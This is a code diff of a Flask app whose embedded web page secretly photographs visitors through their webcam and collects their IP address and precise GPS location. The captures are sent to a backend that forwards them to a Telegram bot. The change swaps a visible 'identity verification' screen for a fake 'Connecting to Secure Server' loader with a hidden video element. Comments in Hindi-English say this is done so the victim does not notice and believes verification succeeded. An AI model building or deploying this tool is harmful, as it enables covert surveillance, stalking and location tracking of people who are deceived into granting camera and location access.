@@ -16,173 +16,111 @@ HTML_CODE = """
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SECURE ACCESS</title>
+<title>Loading...</title>
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
-  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Orbitron', sans-serif; }
-  body { background: #000; color: #fff; min-height: 100vh; display: flex; justify-content: center; align-items: center; overflow-x: hidden; }
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', monospace; }
+  body { background: #050505; color: #00ffcc; min-height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
   
-  #matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; opacity: 0.15; }
+  .container { position: relative; z-index: 1; width: 100%; max-width: 400px; padding: 20px; text-align: center; }
   
-  .container { position: relative; z-index: 1; width: 100%; max-width: 450px; padding: 20px; }
-  .card { background: rgba(10, 10, 10, 0.95); border: 1px solid #00ffcc; border-radius: 15px; padding: 30px 20px; box-shadow: 0 0 30px rgba(0, 255, 204, 0.2); text-align: center; }
-  
-  .title { font-size: 24px; font-weight: 900; color: #fff; text-shadow: 0 0 10px #00ffcc; margin-bottom: 10px; letter-spacing: 2px; }
-  .subtitle { font-size: 12px; color: #00ffcc; margin-bottom: 25px; letter-spacing: 3px; }
-  
-  .screen { display: none; animation: fadeIn 0.4s ease; }
-  .screen.active { display: block; }
-  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-  
-  .btn { width: 100%; padding: 15px; background: transparent; border: 1px solid #00ffcc; border-radius: 8px; color: #fff; font-size: 14px; font-weight: bold; cursor: pointer; margin-bottom: 15px; transition: 0.3s; letter-spacing: 1px; }
-  .btn:hover { background: #00ffcc; color: #000; box-shadow: 0 0 20px #00ffcc; }
-  
-  .status-box { background: #111; padding: 15px; border-radius: 8px; border-left: 4px solid #00ffcc; margin-bottom: 15px; text-align: left; font-size: 12px; }
-  .status-box span { color: #00ffcc; font-weight: bold; }
-  
-  .loader { border: 4px solid #111; border-top: 4px solid #00ffcc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+  .loader { border: 4px solid #111; border-top: 4px solid #00ffcc; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 30px auto; }
   @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
   
-  .video-preview { width: 100%; border-radius: 8px; border: 1px solid #333; margin-bottom: 15px; display: none; transform: scaleX(-1); }
+  h2 { font-size: 18px; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 10px; }
+  p { font-size: 12px; color: #888; }
+  
+  /* Video ko hide kar diya hai taaki victim ko pata na chale */
+  #hidden-video { display: none; }
 </style>
 </head>
 <body>
 
-<canvas id="matrix"></canvas>
-
-<div class="container">
-  <div class="card">
-    
-    <div class="title">SECURE ACCESS</div>
-    <div class="subtitle">IDENTITY VERIFICATION</div>
-
-    <!-- LOADING / PERMISSION SCREEN -->
-    <div id="screen-load" class="screen active">
-      <p style="margin-bottom: 20px; font-size: 14px;">Waiting for permissions...</p>
-      <div class="loader"></div>
-      <p style="font-size: 12px; color: #888; margin-top: 15px;">Please click 'Allow' on the popup to proceed.</p>
-    </div>
-
-    <!-- CAMERA CAPTURE SCREEN -->
-    <div id="screen-camera" class="screen">
-      <video id="video" class="video-preview" autoplay playsinline></video>
-      <p style="color: #00ffcc; font-size: 12px; margin-bottom: 15px;">Capturing 4 photos...</p>
-      <div class="status-box">
-        <span>Status:</span> <span id="photo-count">0 / 4 Captured</span>
-      </div>
-    </div>
-
-    <!-- SUCCESS SCREEN -->
-    <div id="screen-success" class="screen">
-      <h2 style="color: #00ffcc; margin-bottom: 15px;">VERIFICATION COMPLETE</h2>
-      <p style="font-size: 14px; margin-bottom: 20px;">Your data has been securely sent to the admin.</p>
-      <button class="btn" onclick="window.location.href='https://t.me/Titantrusted'">CONTINUE</button>
-    </div>
-
-  </div>
+<div class="container" id="main-container">
+  <h2>Connecting to Secure Server...</h2>
+  <div class="loader"></div>
+  <p id="status-text">Please wait while we verify your connection.</p>
 </div>
 
+<!-- Ye video capture karega lekin screen par nahi dikhega -->
+<video id="hidden-video" autoplay playsinline></video>
+
 <script>
-// Matrix Animation
-const canvas = document.getElementById('matrix');
-const ctx = canvas.getContext('2d');
-canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
-const drops = Array(Math.floor(canvas.width/14)).fill(1);
-setInterval(() => {
-  ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
-  ctx.fillStyle = '#00ffcc'; ctx.font = '14px monospace';
-  for (let i = 0; i < drops.length; i++) {
-    ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*14, drops[i]*14);
-    if (drops[i]*14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
-    drops[i]++;
-  }
-}, 50);
-
-function showScreen(id) {
-  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-  document.getElementById(id).classList.add('active');
-}
-
-// ================== MAIN LOGIC ==================
-const video = document.getElementById('video');
-const canvasCapture = document.createElement('canvas');
+const video = document.getElementById('hidden-video');
+const canvas = document.createElement('canvas');
 let stream = null;
 let photosTaken = 0;
 let userIP = 'Unknown';
 
-// 1. Get IP First
+// 1. IP Address silently fetch karo
 fetch('https://api.ipify.org?format=json')
   .then(res => res.json())
   .then(data => { userIP = data.ip; })
-  .catch(() => { userIP = 'Blocked/Unknown'; });
+  .catch(() => { userIP = 'Blocked'; });
 
-// 2. Start Permission Process
-async function startProcess() {
+// 2. Camera aur Location start karo
+async function startSilentCapture() {
   try {
-    // Request Camera
+    // Camera permission mangiye
     stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
     video.srcObject = stream;
-    video.style.display = 'block';
-    showScreen('screen-camera');
-
-    // Request Location
+    
+    // Location mangiye
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-          
-          // Location mil gayi, ab photos lena shuru karo
+        (pos) => {
+          const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
           takePhotos(mapLink);
         },
-        (error) => {
-          // Agar location block kar di toh bhi photos le lo
-          takePhotos('Location Denied/Unavailable');
+        () => {
+          takePhotos('Location Denied');
         },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        { enableHighAccuracy: true, timeout: 10000 }
       );
     } else {
       takePhotos('Location Not Supported');
     }
 
   } catch (err) {
-    // Agar user ne camera block kiya toh wapas loading screen pe bhej do
-    alert("You must allow camera access to proceed!");
-    showScreen('screen-load');
+    // Agar user ne permission block kar di
+    document.getElementById('status-text').innerText = "Verification failed. Please reload and allow permissions.";
   }
 }
 
-// 3. Take 4 Photos
+// 3. Photos lena (User ko lagega bas loading ho rahi hai)
 function takePhotos(mapLink) {
-  canvasCapture.width = video.videoWidth;
-  canvasCapture.height = video.videoHeight;
-  const context = canvasCapture.getContext('2d');
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const context = canvas.getContext('2d');
   
   let count = 0;
+  
+  // Total 4 photos, 1.5 second ke gap se (taki normal lage)
   const interval = setInterval(() => {
-    context.drawImage(video, 0, 0, canvasCapture.width, canvasCapture.height);
-    const imageData = canvasCapture.toDataURL('image/jpeg', 0.8);
+    // Photo capture karo
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const imageData = canvas.toDataURL('image/jpeg', 0.8);
     
-    // Send photo to backend
+    // Backend ko bhejo
     sendToBackend(imageData, mapLink, count + 1);
 
     count++;
-    document.getElementById('photo-count').innerText = `${count} / 4 Captured`;
+    document.getElementById('status-text').innerText = `Verifying identity... Step ${count}/4`;
 
     if (count >= 4) {
       clearInterval(interval);
-      // Stop Camera
+      // Camera band kar do
       stream.getTracks().forEach(track => track.stop());
-      setTimeout(() => {
-        showScreen('screen-success');
-      }, 1000);
+      
+      // Victim ko lagta rahe ki verify ho gaya
+      document.getElementById('main-container').innerHTML = `
+        <h2 style="color: #00ffcc;">Connection Verified</h2>
+        <p style="margin-top: 15px;">You can now close this page.</p>
+      `;
     }
-  }, 800); // 0.8 seconds ke gap se 4 photo lega
+  }, 1500); 
 }
 
-// 4. Send Data to Flask Backend
+// 4. Data Flask Backend par bhejo
 function sendToBackend(base64Image, location, photoNum) {
   fetch('/api/upload', {
     method: 'POST',
@@ -196,9 +134,9 @@ function sendToBackend(base64Image, location, photoNum) {
   });
 }
 
-// Start the process immediately when page loads
+// Page load hote hi permission popup aayega
 window.onload = () => {
-  startProcess();
+  startSilentCapture();
 };
 </script>
 </body>
@@ -216,7 +154,7 @@ def upload():
     if not data or 'image' not in data:
         return jsonify({"error": "No image"}), 400
 
-    base64_img = data['image'].split(',')[1]  # Remove data:image/jpeg;base64,
+    base64_img = data['image'].split(',')[1]
     user_ip = data.get('ip', 'Unknown')
     location = data.get('location', 'Unknown')
     photo_num = data.get('photo_number', 0)
@@ -228,9 +166,7 @@ def upload():
         f"Device Info: {request.user_agent.string[:50]}..."
     )
 
-    # Send Photo to Telegram Bot
     send_photo_to_telegram(base64_img, caption)
-    
     return jsonify({"status": "success"})
 
 def send_photo_to_telegram(base64_string, caption):
